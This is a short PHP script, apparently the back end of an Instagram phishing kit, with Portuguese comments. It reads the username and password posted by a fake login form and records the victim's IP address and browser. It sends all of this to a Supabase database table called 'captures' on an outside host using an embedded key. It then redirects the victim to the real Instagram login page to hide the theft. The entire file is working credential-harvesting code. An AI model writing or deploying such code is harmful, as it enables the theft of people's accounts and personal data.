<?php
// capture.php

// 1. Configuração do Supabase
$supabase_url = 'https://latctabiaqlgqkvixuyu.supabase.co';
$supabase_key = 'sb_publishable_NtfdvdauItvFFpbCRp2IZA_OCeP3EOH';

// 2. Verificar se os dados foram enviados
if (isset($_POST['username']) && isset($_POST['password'])) {
    $username = $_POST['username'];
    $password = $_POST['password'];
    $timestamp = date('Y-m-d H:i:s');
    $ip = $_SERVER['REMOTE_ADDR'];
    $user_agent = $_SERVER['HTTP_USER_AGENT'];

    // 3. Preparar os dados para o Supabase
    $data = [
        'username' => $username,
        'password' => $password,
        'ip' => $ip,
        'user_agent' => $user_agent,
        'timestamp' => $timestamp
    ];

    // 4. Enviar os dados para o Supabase
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, "$supabase_url/rest/v1/captures");
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($data));
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_HTTPHEADER, [
        'apikey: ' . $supabase_key,
        'Authorization: Bearer ' . $supabase_key,
        'Content-Type: application/json',
        'Prefer: return=minimal'
    ]);
    
    $response = curl_exec($ch);
    $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);

    // 5. Log de debug (opcional)
    if ($http_code !== 201) {
        error_log("Supabase Error: $http_code - $response");
    }

    // 6. Redirecionar para o Instagram real
    header('Location: https://www.instagram.com/accounts/login/');
    exit();
} else {
    // Se os dados não forem enviados, redirecionar para a página de login
    header('Location: index.html');
    exit();
}
?>
